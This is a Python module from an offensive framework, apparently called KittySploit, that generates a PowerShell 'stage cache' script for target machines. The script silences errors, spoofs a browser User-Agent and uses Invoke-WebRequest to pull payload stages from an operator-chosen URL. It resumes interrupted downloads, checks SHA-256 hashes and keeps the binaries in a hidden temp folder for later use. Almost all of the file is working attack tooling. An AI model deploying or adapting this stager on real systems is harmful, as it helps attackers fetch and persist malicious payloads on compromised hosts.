#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from typing import Any, Dict

from kittysploit import *
from core.payload_generation.prestage.stage_cache_context import resolve_stage_cache_context


class Module(Prestage):
    PRESTAGE_ID = "stage_cache"

    __info__ = {
        "name": "Stage Cache (PowerShell)",
        "description": "Verified local stage cache with TTL expiration and interrupted download resume",
        "author": "KittySploit Team",
        "version": "1.0.0",
        "platform": Platform.MULTI,
        "languages": ["powershell"],
        "prestage_dependencies": ["telemetry_buffer"],
        "tags": ["prestage", "offline", "staging", "cache", "powershell"],
    }

    cache_dir = OptString("", "Cache directory on target (default: temp/.kitty_stage_cache)", False)
    cache_ttl = OptString("86400", "Cache entry TTL in seconds", False)
    stage_url = OptString("", "Default stage URL for fetch()", False)

    def generate_powershell(self, context: Dict[str, Any] = None) -> str:
        cfg = resolve_stage_cache_context(self, context)
        cache_dir = str(cfg.get("cache_dir") or "").replace("'", "''")
        cache_ttl = int(cfg.get("cache_ttl") or 86400)
        stage_url = str(cfg.get("stage_url") or "").replace("'", "''")
        dir_expr = f"'{cache_dir}'" if cache_dir else "[IO.Path]::Combine([IO.Path]::GetTempPath(), '.kitty_stage_cache')"
        return f"""
$ErrorActionPreference='SilentlyContinue'
function _KittyStageCache {{
  param([string]$CacheDir,[int]$TtlSeconds=86400,[string]$DefaultUrl='')
  $this.CacheDir=$CacheDir
  $this.TtlSeconds=$TtlSeconds
  $this.DefaultUrl=$DefaultUrl
  [IO.Directory]::CreateDirectory($this.CacheDir)|Out-Null
  return $this
}}
function _KittyStageKey([string]$url) {{
  $sha=[System.Security.Cryptography.SHA256]::Create()
  return ([BitConverter]::ToString($sha.ComputeHash([Text.Encoding]::UTF8.GetBytes($url)))).Replace('-','').ToLower()
}}
function _KittyStagePaths($self,[string]$url) {{
  $k=_KittyStageKey $url
  $base=[IO.Path]::Combine($self.CacheDir,$k)
  return @{{ meta=$base+'.meta.json'; part=$base+'.part'; final=$base+'.bin' }}
}}
function _KittyStageGet($self,[string]$url,[string]$expectedSha='') {{
  $paths=_KittyStagePaths $self $url
  if(Test-Path $paths.meta){{
    $meta=Get-Content $paths.meta -Raw | ConvertFrom-Json
    if($meta.expires_at -and [double]$meta.expires_at -gt [DateTimeOffset]::UtcNow.ToUnixTimeSeconds()){{
      if(Test-Path $paths.final){{
        $bytes=[IO.File]::ReadAllBytes($paths.final)
        if($expectedSha){{
          $sha=[System.Security.Cryptography.SHA256]::Create()
          $digest=([BitConverter]::ToString($sha.ComputeHash($bytes))).Replace('-','').ToLower()
          if($digest -ne $expectedSha.ToLower()){{ return $null }}
        }}
        return $bytes
      }}
    }}
  }}
  return $null
}}
function _KittyStageFetch($self,[string]$url,[string]$expectedSha='') {{
  if(-not $url){{ $url=$self.DefaultUrl }}
  if(-not $url){{ throw 'stage_cache: missing url' }}
  $cached=_KittyStageGet $self $url $expectedSha
  if($cached){{
    return $cached
  }}
  $paths=_KittyStagePaths $self $url
  $offset=0
  if(Test-Path $paths.part){{ $offset=(Get-Item $paths.part).Length }}
  $headers=@{{ 'User-Agent'='Mozilla/5.0' }}
  if($offset -gt 0){{ $headers['Range']="bytes=$offset-" }}
  $resp=Invoke-WebRequest -Uri $url -Headers $headers -UseBasicParsing -TimeoutSec 120
  $mode=[IO.FileMode]::Create
  if($offset -gt 0 -and $resp.StatusCode -in 200,206){{ $mode=[IO.FileMode]::Append }}
  else {{ $offset=0 }}
  $fs=[IO.File]::Open($paths.part,$mode,[IO.FileAccess]::Write)
  try {{ $fs.Write($resp.Content,0,$resp.Content.Length) }} finally {{ $fs.Close() }}
  $bytes=[IO.File]::ReadAllBytes($paths.part)
  $sha=[System.Security.Cryptography.SHA256]::Create()
  $digest=([BitConverter]::ToString($sha.ComputeHash($bytes))).Replace('-','').ToLower()
  if($expectedSha -and $digest -ne $expectedSha.ToLower()){{ throw 'stage_cache sha256 mismatch' }}
  Move-Item -Force $paths.part $paths.final
  $meta=@{{ url=$url; sha256=$digest; size=$bytes.Length; expires_at=([DateTimeOffset]::UtcNow.ToUnixTimeSeconds()+$self.TtlSeconds); saved_at=[DateTimeOffset]::UtcNow.ToUnixTimeSeconds() }}
  ($meta | ConvertTo-Json -Compress) | Set-Content -Path $paths.meta -Encoding UTF8
  return $bytes
}}
$global:_kitty_stage_cache=[pscustomobject]@{{
  CacheDir={dir_expr}
  TtlSeconds={cache_ttl}
  DefaultUrl='{stage_url}'
}}
[IO.Directory]::CreateDirectory($global:_kitty_stage_cache.CacheDir)|Out-Null
Add-Member -InputObject $global:_kitty_stage_cache -MemberType ScriptMethod -Name get -Value {{ param($url,$expectedSha='') _KittyStageGet $this $url $expectedSha }}
Add-Member -InputObject $global:_kitty_stage_cache -MemberType ScriptMethod -Name fetch -Value {{ param($url='',$expectedSha='') _KittyStageFetch $this $url $expectedSha }}
""".strip()
